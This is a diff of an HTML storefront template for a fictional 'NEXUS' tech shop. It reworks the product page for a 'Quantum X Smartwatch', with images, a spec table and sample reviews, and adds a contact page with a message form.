-                                <img src="https://images.unsplash.com/photo-1546868871-7041f2a55e12?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=200&q=80"
-                                      alt="Quantum X Smartwatch - Angle 3"
-                                      class="w-full h-20 object-cover rounded">
-                            </div>
-                            <div class="cyber-gradient-bg rounded-lg p-2 cursor-pointer hover:glow-box transition duration-300 border border-gray-800 hover:border-emerald-400">
-                                <img src="https://images.unsplash.com/photo-1558433916-90a36b44753f?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=200&q=80"
-                                      alt="Quantum X Smartwatch - Angle 4"
-                                      class="w-full h-20 object-cover rounded">
-                            </div>
-                        </div>
+        <!-- Product Content -->
+        <div class="pt-32 pb-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-16">
+                <!-- Product Images -->
+                <div>
+                    <div class="mb-6 rounded-xl overflow-hidden">
+                        <img id="product-detail-image" src="https://images.unsplash.com/photo-1551269901-5c5e14c25df7?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" 
+                             alt="Quantum X Smartwatch" class="w-full h-auto rounded-xl">
                     </div>
-                    
-                    <!-- Product Info -->
-                    <div class="space-y-6">
-                        <div>
-                            <span class="text-emerald-400 text-sm font-medium">SMARTWEAR COLLECTION</span>
-                            <h1 id="product-detail-name" class="orbitron text-4xl font-bold text-white mt-2 glow-text">Quantum X Smartwatch</h1>
-                            <div class="flex items-center mt-3 space-x-2">
-                                <div class="flex text-amber-400">
-                                    <i class="fas fa-star"></i>
-                                    <i class="fas fa-star"></i>
-                                    <i class="fas fa-star"></i>
-                                    <i class="fas fa-star"></i>
-                                    <i class="fas fa-star-half-alt"></i>
-                                </div>
-                                <span class="text-gray-400 text-sm">(128 reviews)</span>
-                                <span class="text-green-500 text-sm ml-4">
-                                    <i class="fas fa-check-circle mr-1"></i> In stock
-                                </span>
-                            </div>
+                    <div class="grid grid-cols-4 gap-4">
+                        <div class="border-2 border-emerald-500 rounded-xl overflow-hidden">
+                            <img src="https://images.unsplash.com/photo-1551269901-5c5e14c25df7?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=200&q=80" 
+                                 alt="Product thumbnail" class="w-full h-auto">
                         </div>
-                        
-                        <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800">
-                            <div class="flex items-end space-x-4">
-                                <span id="product-detail-price" class="orbitron text-3xl font-bold text-white">$249.99</span>
-                                <span class="text-gray-400 line-through">$299.99</span>
-                                <span class="bg-red-900 text-red-200 text-xs font-bold px-2 py-1 rounded">16% OFF</span>
-                            </div>
-                            <p class="text-gray-400 mt-2">Free worldwide shipping on all orders over $100</p>
+                        <div class="border-2 border-transparent hover:border-emerald-500 rounded-xl overflow-hidden transition-all duration-300">
+                            <img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=200&q=80" 
+                                 alt="Product thumbnail" class="w-full h-auto">
                         </div>
-                        
-                        <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800">
-                            <h3 class="orbitron text-lg font-medium text-white mb-4">COLOR OPTIONS</h3>
-                            <div class="flex space-x-4">
-                                <div class="color-option w-10 h-10 rounded-full bg-gray-800 border-2 border-gray-700 cursor-pointer transition duration-300"
-                                      style="background-color: #1a1a1a;"
-                                      data-color="Obsidian Black"></div>
-                                <div class="color-option w-10 h-10 rounded-full bg-gray-300 border-2 border-gray-400 cursor-pointer transition duration-300"
-                                      style="background-color: #e0e0e0;"
-                                      data-color="Lunar Silver"></div>
-                                <div class="color-option w-10 h-10 rounded-full bg-amber-800 border-2 border-amber-700 cursor-pointer transition duration-300"
-                                      style="background-color: #b87333;"
-                                      data-color="Solar Gold"></div>
-                                <div class="color-option w-10 h-10 rounded-full bg-blue-900 border-2 border-blue-800 cursor-pointer transition duration-300"
-                                      style="background-color: #1e3a8a;"
-                                      data-color="Nebula Blue"></div>
-                            </div>
-                            <p id="selected-color" class="text-emerald-400 mt-3">Selected: Obsidian Black</p>
+                        <div class="border-2 border-transparent hover:border-emerald-500 rounded-xl overflow-hidden transition-all duration-300">
+                            <img src="https://images.unsplash.com/photo-1546868871-7041f2a55e12?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=200&q=80" 
+                                 alt="Product thumbnail" class="w-full h-auto">
                         </div>
-                        
-                        <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800">
-                            <h3 class="orbitron text-lg font-medium text-white mb-4">QUANTITY</h3>
-                            <div class="flex items-center">
-                                <button class="bg-gray-800 text-white w-10 h-10 rounded-l-lg hover:bg-gray-700 transition duration-300">
-                                    <i class="fas fa-minus"></i>
-                                </button>
-                                <input type="number" value="1" min="1" class="bg-gray-900 text-white text-center w-16 h-10 border-t border-b border-gray-700">
-                                <button class="bg-gray-800 text-white w-10 h-10 rounded-r-lg hover:bg-gray-700 transition duration-300">
-                                    <i class="fas fa-plus"></i>
-                                </button>
-                            </div>
-                        </div>
-                        
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                            <button class="bg-gradient-to-r from-cyan-500 to-emerald-500 text-black orbitron font-bold py-4 px-6 rounded-lg hover:from-cyan-400 hover:to-emerald-400 transition duration-500 transform hover:scale-105" onclick="showPage('cart-page')">
-                                ADD TO CART <i class="fas fa-shopping-cart ml-2"></i>
-                            </button>
-                            <button class="bg-gray-900 text-white orbitron font-bold py-4 px-6 rounded-lg border border-gray-700 hover:border-emerald-400 hover:text-emerald-400 transition duration-300" onclick="startCheckout()">
-                                BUY NOW <i class="fas fa-bolt ml-2"></i>
-                            </button>
-                        </div>
-                        
-                        <div class="flex items-center justify-center space-x-6 text-gray-400 mt-4">
-                            <div class="flex items-center hover:text-emerald-400 cursor-pointer transition duration-300">
-                                <i class="far fa-heart mr-2"></i> <span>Wishlist</span>
-                            </div>
-                            <div class="flex items-center hover:text-emerald-400 cursor-pointer transition duration-300">
-                                <i class="fas fa-share-alt mr-2"></i> <span>Share</span>
-                            </div>
-                            <div class="flex items-center hover:text-emerald-400 cursor-pointer transition duration-300">
-                                <i class="fas fa-exchange-alt mr-2"></i> <span>Compare</span>
-                            </div>
+                        <div class="border-2 border-transparent hover:border-emerald-500 rounded-xl overflow-hidden transition-all duration-300">
+                            <img src="https://images.unsplash.com/photo-1585123334904-845d60e97b29?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=200&q=80" 
+                                 alt="Product thumbnail" class="w-full h-auto">
                         </div>
                     </div>
                 </div>
-                
+
                 <!-- Product Details -->
-                <div class="mt-20">
-                    <div class="border-b border-gray-800 pb-6">
-                        <h2 class="orbitron text-3xl font-bold text-white glow-text">Product Details</h2>
+                <div>
+                    <h1 id="product-detail-name" class="text-4xl font-display font-bold mb-4">Quantum X Smartwatch</h1>
+                    <div class="flex items-center mb-6">
+                        <div class="flex text-amber-400 mr-4">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star-half-alt"></i>
+                        </div>
+                        <span class="text-gray-400">4.7 (128 reviews)</span>
                     </div>
                     
-                    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 mt-8">
-                        <div id="product-detail-description" class="lg:col-span-2">
-                            <!-- Content loaded by JavaScript -->
+                    <p id="product-detail-price" class="text-3xl font-bold text-emerald-400 mb-6">$249.99</p>
+                    
+                    <div id="product-detail-description" class="text-gray-400 mb-8">
+                        <p class="mb-6">
+                            The Quantum X Smartwatch represents the pinnacle of wearable technology, blending cutting-edge innovation with luxurious design. 
+                            Engineered for those who demand excellence, this timepiece redefines what a smartwatch can be.
+                        </p>
+                        <p class="mb-6">
+                            Featuring a revolutionary holographic display, military-grade durability, and biometric sensors that monitor your health with 
+                            unprecedented accuracy, the Quantum X is more than a watch—it's your personal command center.
+                        </p>
+                        <ul class="space-y-3">
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-emerald-400 mt-1 mr-3"></i>
+                                <span>1.8" AMOLED Holographic Display (450x450 resolution)</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-emerald-400 mt-1 mr-3"></i>
+                                <span>Military-Grade Titanium Alloy Case (50m water resistant)</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-emerald-400 mt-1 mr-3"></i>
+                                <span>Advanced Biometric Sensors (ECG, SpO2, Stress, Sleep)</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-emerald-400 mt-1 mr-3"></i>
+                                <span>30-day battery life with Quantum Charge technology</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-emerald-400 mt-1 mr-3"></i>
+                                <span>Built-in AI Assistant with voice control</span>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <!-- Color Selection -->
+                    <div class="mb-8">
+                        <h3 class="text-lg font-bold mb-4">Color Options</h3>
+                        <div class="flex space-x-4">
+                            <div class="w-10 h-10 bg-gray-800 rounded-full border-2 border-emerald-500 cursor-pointer pulse"></div>
+                            <div class="w-10 h-10 bg-gray-600 rounded-full cursor-pointer hover:scale-110 transition-all duration-300"></div>
+                            <div class="w-10 h-10 bg-rose-500 rounded-full cursor-pointer hover:scale-110 transition-all duration-300"></div>
+                            <div class="w-10 h-10 bg-cyan-500 rounded-full cursor-pointer hover:scale-110 transition-all duration-300"></div>
                         </div>
-                        
+                    </div>
+
+                    <!-- Add to Cart -->
+                    <div class="flex items-center space-x-4 mb-8">
+                        <div class="flex items-center border border-gray-700 rounded-full overflow-hidden">
+                            <button class="px-4 py-2 bg-gray-800 text-white hover:bg-gray-700 transition-all duration-300">-</button>
+                            <span class="px-4 py-2 bg-transparent">1</span>
+                            <button class="px-4 py-2 bg-gray-800 text-white hover:bg-gray-700 transition-all duration-300">+</button>
+                        </div>
+                        <button class="flex-1 px-8 py-3 bg-gradient-to-r from-emerald-500 to-green-500 text-white rounded-full font-bold hover:opacity-90 transition-all duration-300">
+                            Add to Cart
+                        </button>
+                    </div>
+
+                    <!-- Additional Info -->
+                    <div class="border-t border-gray-800 pt-6">
+                        <div class="flex items-center text-gray-400 mb-2">
+                            <i class="fas fa-truck mr-3 text-emerald-400"></i>
+                            <span>Free global shipping on orders over $100</span>
+                        </div>
+                        <div class="flex items-center text-gray-400">
+                            <i class="fas fa-undo mr-3 text-emerald-400"></i>
+                            <span>30-day money-back guarantee</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Product Tabs -->
+            <div class="mt-16 border-b border-gray-800">
+                <nav class="flex space-x-8">
+                    <button class="py-4 px-1 border-b-2 border-emerald-500 text-emerald-400 font-medium">
+                        Technical Specifications
+                    </button>
+                    <button class="py-4 px-1 border-b-2 border-transparent text-gray-400 hover:text-emerald-400 font-medium">
+                        Reviews
+                    </button>
+                    <button class="py-4 px-1 border-b-2 border-transparent text-gray-400 hover:text-emerald-400 font-medium">
+                        FAQ
+                    </button>
+                </nav>
+            </div>
+
+            <!-- Technical Specifications -->
+            <div id="product-detail-tech-specs" class="py-8">
+                <table class="w-full text-gray-400">
+                    <tbody class="divide-y divide-gray-800">
+                        <tr><td class="py-3 font-medium">Display</td><td class="py-3 text-right">1.8" AMOLED Holographic</td></tr>
+                        <tr><td class="py-3 font-medium">Processor</td><td class="py-3 text-right">Quantum Core X1</td></tr>
+                        <tr><td class="py-3 font-medium">RAM</td><td class="py-3 text-right">2GB</td></tr>
+                        <tr><td class="py-3 font-medium">Storage</td><td class="py-3 text-right">32GB</td></tr>
+                        <tr><td class="py-3 font-medium">Battery</td><td class="py-3 text-right">500mAh (30 days)</td></tr>
+                        <tr><td class="py-3 font-medium">Connectivity</td><td class="py-3 text-right">Bluetooth 5.2, WiFi, LTE</td></tr>
+                        <tr><td class="py-3 font-medium">Sensors</td><td class="py-3 text-right">ECG, SpO2, Accelerometer, Gyro</td></tr>
+                        <tr><td class="py-3 font-medium">Water Resistance</td><td class="py-3 text-right">50m</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- Reviews -->
+            <div id="product-detail-reviews" class="py-8 space-y-6">
+                <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800">
+                    <div class="flex justify-between items-start">
                         <div>
-                            <h3 class="orbitron text-xl font-medium text-white mb-4">TECH SPECS</h3>
-                            <div id="product-detail-tech-specs" class="cyber-gradient-bg rounded-xl p-6 border border-gray-800">
-                                <!-- Content loaded by JavaScript -->
+                            <h3 class="orbitron text-lg font-medium text-white">Alex M.</h3>
+                            <div class="flex text-amber-400 mt-1">
+                                <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
                             </div>
                         </div>
+                        <span class="text-gray-400 text-sm">2 days ago</span>
                     </div>
+                    <p class="text-gray-300 mt-4">
+                        "This watch is absolutely revolutionary! The holographic display works flawlessly and the battery life is insane. 
+                        I've had it for a week and it's only at 75% with moderate use. Worth every penny!"
+                    </p>
                 </div>
                 
-                <!-- Features -->
-                <div class="mt-20">
-                    <div class="border-b border-gray-800 pb-6">
-                        <h2 class="orbitron text-3xl font-bold text-white glow-text">Advanced Features</h2>
+                <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800">
+                    <div class="flex justify-between items-start">
+                        <div>
+                            <h3 class="orbitron text-lg font-medium text-white">Sarah K.</h3>
+                            <div class="flex text-amber-400 mt-1">
+                                <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i>
+                            </div>
+                        </div>
+                        <span class="text-gray-400 text-sm">1 week ago</span>
                     </div>
-                    
-                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mt-10">
-                        <div class="feature-card cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-emerald-400 transition duration-300">
-                            <div class="feature-icon text-4xl text-emerald-400 mb-4">
-                                <i class="fas fa-heartbeat"></i>
-                            </div>
-                            <h3 class="orbitron text-lg font-medium text-white mb-2">Health Monitoring</h3>
-                            <p class="text-gray-400">
-                                Advanced sensors track heart rate, blood oxygen, stress levels, and sleep patterns with medical-grade accuracy.
-                            </p>
-                        </div>
-                        <div class="feature-card cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-emerald-400 transition duration-300">
-                            <div class="feature-icon text-4xl text-emerald-400 mb-4">
-                                <i class="fas fa-bolt"></i>
-                            </div>
-                            <h3 class="orbitron text-lg font-medium text-white mb-2">Quantum Charge</h3>
-                            <p class="text-gray-400">
-                                Revolutionary charging technology delivers 7 days of battery life in just 15 minutes of charging.
-                            </p>
-                        </div>
-                        <div class="feature-card cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-emerald-400 transition duration-300">
-                            <div class="feature-icon text-4xl text-emerald-400 mb-4">
-                                <i class="fas fa-project-diagram"></i>
-                            </div>
-                            <h3 class="orbitron text-lg font-medium text-white mb-2">Holographic UI</h3>
-                            <p class="text-gray-400">
-                                Next-generation display technology projects a stunning holographic interface above the watch face.
-                            </p>
-                        </div>
-                        <div class="feature-card cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-emerald-400 transition duration-300">
-                            <div class="feature-icon text-4xl text-emerald-400 mb-4">
-                                <i class="fas fa-robot"></i>
-                            </div>
-                            <h3 class="orbitron text-lg font-medium text-white mb-2">AI Assistant</h3>
-                            <p class="text-gray-400">
-                                Your personal AI learns your habits and preferences to anticipate your needs before you ask.
-                            </p>
-                        </div>
-                    </div>
+                    <p class="text-gray-300 mt-4">
+                        "The health monitoring features are incredibly accurate. It detected an irregular heartbeat that my doctor confirmed. 
+                        The design is sleek and futuristic - I get compliments everywhere I go."
+                    </p>
                 </div>
-                
-                <!-- Reviews -->
-                <div class="mt-20">
-                    <div class="border-b border-gray-800 pb-6">
-                        <h2 class="orbitron text-3xl font-bold text-white glow-text">Customer Reviews</h2>
+            </div>
+        </div>
+    </div>
+
+    <!-- Contact Page -->
+    <div id="contact-page" class="hidden min-h-screen">
+        <!-- Navigation (Contact Page Specific) -->
+        <nav class="bg-black bg-opacity-80 backdrop-blur-md border-b border-blue-500 border-opacity-20 fixed w-full z-50">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                <div class="flex items-center justify-between h-16">
+                    <div class="flex items-center">
+                        <div class="flex-shrink-0">
+                            <span class="text-2xl font-display font-bold gradient-text cursor-pointer" onclick="showPage('home-page')">NEXUS</span>
+                        </div>
+                        <div class="hidden md:block ml-10">
+                            <div class="flex space-x-8">
+                                <a class="text-gray-300 hover:text-blue-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('home-page')">Home</a>
+                                <a class="text-gray-300 hover:text-blue-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('collections-page')">Collections</a>
+                                <a class="text-gray-300 hover:text-blue-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('about-page')">About</a>
+                                <a class="text-blue-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer">Contact</a>
+                            </div>
+                        </div>
                     </div>
-                    
-                    <div id="product-detail-reviews" class="grid grid-cols-1 lg:grid-cols-2 gap-8 mt-10">
-                        <!-- Content loaded by JavaScript -->
-                    </div>
-                    
-                    <div class="text-center mt-10">
-                        <button class="bg-gray-900 text-white orbitron font-bold py-3 px-8 rounded-lg border border-gray-700 hover:border-emerald-400 hover:text-emerald-400 transition duration-300">
-                            VIEW ALL REVIEWS <i class="fas fa-chevron-right ml-2"></i>
+                    <div class="flex items-center space-x-4">
+                        <button class="p-2 text-gray-300 hover:text-blue-400 transition-all duration-300" onclick="showPage('cart-page')">
+                            <i class="fas fa-shopping-cart text-lg"></i>
+                        </button>
+                        <button class="px-4 py-2 bg-gradient-to-r from-blue-500 to-indigo-500 text-white rounded-full font-medium hover:opacity-90 transition-all duration-300" onclick="showPage('login-page')">
+                            Sign In
                         </button>
                     </div>
                 </div>
-                
-                <!-- Related Products -->
-                <div class="mt-20">
-                    <div class="border-b border-gray-800 pb-6">
-                        <h2 class="orbitron text-3xl font-bold text-white glow-text">You May Also Like</h2>
-                    </div>
-                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8 mt-8">
-                        <!-- Related Product 1 -->
-                        <div class="product-card bg-gray-900 bg-opacity-50 rounded-xl overflow-hidden border border-gray-800 transition duration-300 hover:border-cyan-500">
-                            <div class="relative overflow-hidden rounded-t-xl h-48">
-                                <img src="https://images.unsplash.com/photo-1593784991095-a205069470b6?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80"
-                                      alt="Nebula Pro Earbuds"
-                                      class="w-full h-full object-cover">
-                                <div class="absolute inset-0 bg-black bg-opacity-30 flex items-center justify-center opacity-0 hover:opacity-100 transition duration-300">
-                                    <button class="bg-white text-black font-bold py-2 px-6 rounded-full transform hover:scale-110 transition duration-300" onclick="showPage('product-page', 'nebula-earbuds')">
-                                        QUICK VIEW
-                                    </button>
-                                </div>
-                            </div>
-                            <div class="p-4">
-                                <h3 class="tech-font text-lg font-medium text-white mb-1">Nebula Pro Earbuds</h3>
-                                <div class="flex text-amber-400 text-sm mb-2">
-                                    <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                                </div>
-                                <div class="flex items-center justify-between">
-                                    <span class="text-lg font-bold text-cyan-400">$179.99</span>
-                                    <button class="px-3 py-1 bg-cyan-500 text-black text-sm font-medium rounded-full hover:bg-cyan-400 transition duration-300" onclick="showPage('cart-page')">
-                                        <i class="fas fa-cart-plus"></i>
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
-                        <!-- Related Product 2 -->
-                        <div class="product-card bg-gray-900 bg-opacity-50 rounded-xl overflow-hidden border border-gray-800 transition duration-300 hover:border-cyan-500">
-                            <div class="relative overflow-hidden rounded-t-xl h-48">
-                                <img src="https://images.unsplash.com/photo-1516035069371-29a1b244cc32?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80"
-                                      alt="Phantom X Phone"
-                                      class="w-full h-full object-cover">
-                                <div class="absolute inset-0 bg-black bg-opacity-30 flex items-center justify-center opacity-0 hover:opacity-100 transition duration-300">
-                                    <button class="bg-white text-black font-bold py-2 px-6 rounded-full transform hover:scale-110 transition duration-300" onclick="showPage('product-page', 'phantom-phone')">
-                                        QUICK VIEW
-                                    </button>
-                                </div>
-                            </div>
-                            <div class="p-4">
-                                <h3 class="tech-font text-lg font-medium text-white mb-1">Phantom X Phone</h3>
-                                <div class="flex text-amber-400 text-sm mb-2">
-                                    <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i>
-                                </div>
-                                <div class="flex items-center justify-between">
-                                    <span class="text-lg font-bold text-cyan-400">$999.99</span>
-                                    <button class="px-3 py-1 bg-cyan-500 text-black text-sm font-medium rounded-full hover:bg-cyan-400 transition duration-300" onclick="showPage('cart-page')">
-                                        <i class="fas fa-cart-plus"></i>
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
-                        <!-- Related Product 3 -->
-                        <div class="product-card bg-gray-900 bg-opacity-50 rounded-xl overflow-hidden border border-gray-800 transition duration-300 hover:border-cyan-500">
-                            <div class="relative overflow-hidden rounded-t-xl h-48">
-                                <img src="https://images.unsplash.com/photo-1592155931584-901ac15763e3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80"
-                                      alt="Aurora VR Headset"
-                                      class="w-full h-full object-cover">
-                                <div class="absolute inset-0 bg-black bg-opacity-30 flex items-center justify-center opacity-0 hover:opacity-100 transition duration-300">
-                                    <button class="bg-white text-black font-bold py-2 px-6 rounded-full transform hover:scale-110 transition duration-300" onclick="showPage('product-page', 'aurora-vr')">
-                                        QUICK VIEW
-                                    </button>
-                                </div>
-                            </div>
-                            <div class="p-4">
-                                <h3 class="tech-font text-lg font-medium text-white mb-1">Aurora VR Headset</h3>
-                                <div class="flex text-amber-400 text-sm mb-2">
-                                    <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="far fa-star"></i>
-                                </div>
-                                <div class="flex items-center justify-between">
-                                    <span class="text-lg font-bold text-cyan-400">$449.99</span>
-                                    <button class="px-3 py-1 bg-cyan-500 text-black text-sm font-medium rounded-full hover:bg-cyan-400 transition duration-300" onclick="showPage('cart-page')">
-                                        <i class="fas fa-cart-plus"></i>
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
             </div>
-        </main>
+        </nav>
 
-        <!-- Footer (Product Page Specific) -->
-        <footer class="bg-black py-16 border-t border-gray-800">
-            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                <div class="grid grid-cols-1 md:grid-cols-4 gap-12">
-                    <div>
-                        <span class="tech-font text-2xl font-bold cyber-gradient-text cursor-pointer" onclick="showPage('home-page')">NEXUS</span>
-                        <p class="text-gray-400 mt-4">
-                            Redefining the future of technology with innovative products that blend cutting-edge performance with luxurious design.
-                        </p>
-                        <div class="flex space-x-4 mt-6">
-                            <a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">
-                                <i class="fab fa-facebook-f"></i>
-                            </a>
-                            <a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">
-                                <i class="fab fa-twitter"></i>
-                            </a>
-                            <a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">
-                                <i class="fab fa-instagram"></i>
-                            </a>
-                            <a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">
-                                <i class="fab fa-youtube"></i>
-                            </a>
+        <!-- Contact Content -->
+        <div class="pt-32 pb-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
+            <div class="text-center mb-16">
+                <h1 class="text-4xl md:text-5xl font-display font-bold mb-6">
+                    <span class="gradient-text">Contact</span> Us
+                </h1>
+                <p class="text-gray-400 max-w-2xl mx-auto">
+                    Have questions or need assistance? Our team is here to help you with any inquiries.
+                </p>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-16">
+                <!-- Contact Form -->
+                <div class="bg-gradient-to-b from-gray-900 to-cosmic rounded-xl p-8 border border-gray-800">
+                    <h2 class="text-2xl font-bold mb-6">Send us a Message</h2>
+                    <form id="contact-form" action="submit_contact.php" method="POST">
+                        <div class="mb-6">
+                            <label for="name" class="block text-gray-400 mb-2">Full Name</label>
+                            <input type="text" id="name" name="name" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg text-white focus:outline-none focus:border-blue-500 transition-all duration-300" required>
                         </div>
-                    </div>
-                    <div>
-                        <h3 class="tech-font text-lg font-medium text-white mb-4">SHOP</h3>
-                        <ul class="space-y-3">
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Smartwatches</a></li>
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Smartphones</a></li>
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Audio</a></li>
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Drones</a></li>
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">VR Headsets</a></li>
-                        </ul>
-                    </div>
-                    <div>
-                        <h3 class="tech-font text-lg font-medium text-white mb-4">SUPPORT</h3>
-                        <ul class="space-y-3">
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Contact Us</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">FAQs</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Shipping</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Returns</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Warranty</a></li>
-                        </ul>
-                    </div>
-                    <div>
-                        <h3 class="tech-font text-lg font-medium text-white mb-4">COMPANY</h3>
-                        <ul class="space-y-3">
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300" onclick="showPage('about-page')">About Us</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Careers</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Blog</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Press</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Investors</a></li>
-                        </ul>
-                    </div>
+                        <div class="mb-6">
+                            <label for="email" class="block text-gray-400 mb-2">Email Address</label>
+                            <input type="email" id="email" name="email" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg text-white focus:outline-none focus:border-blue-500 transition-all duration-300" required>
+                        </div>
+                        <div class="mb-6">
+                            <label for="subject" class="block text-gray-400 mb-2">Subject</label>
+                            <input type="text" id="subject" name="subject" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg text-white focus:outline-none focus:border-blue-500 transition-all duration-300" required>
+                        </div>
+                        <div class="mb-6">
+                            <label for="message" class="block text-gray-400 mb-2">Message</label>
+                            <textarea id="message" name="message" rows="5" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg text-white focus:outline-none focus:border-blue-500 transition-all duration-300" required></textarea>
+                        </div>
+                        <button type="submit" class="w-full px-6 py-3 bg-gradient-to-r from-blue-500 to-indigo-500 text-white rounded-lg font-bold hover:opacity-90 transition-all duration-300">
+                            Send Message
+                        </button>
+                    </form>
                 </div>
-                <div class="border-t border-gray-800 mt-16 pt-8 flex flex-col md:flex-row justify-between items-center">
-                    <p class="text-gray-400 text-sm">
-                        © 2023 Nexus Technologies. All rights reserved.
+
+                <!-- Contact Information -->
+                <div>
+                    <h2 class="text-2xl font-bold mb-6">Get in Touch</h2>
+                    <p class="text-gray-400 mb-8">
+                        We're here to assist you with any questions about our products, shipping, or your order. 
+                        Reach out to us through any of the following channels.
                     </p>
-                    <div class="flex space-x-6 mt-4 md:mt-0">
-                        <a href="#" class="text-gray-400 hover:text-white text-sm transition duration-300">Privacy Policy</a>
-                        <a href="#" class="text-gray-400 hover:text-white text-sm transition duration-300">Terms of Service</a>
-                        <a href="#" class="text-gray-400 hover:text-white text-sm transition duration-300">Cookie Policy</a>
-                    </div>
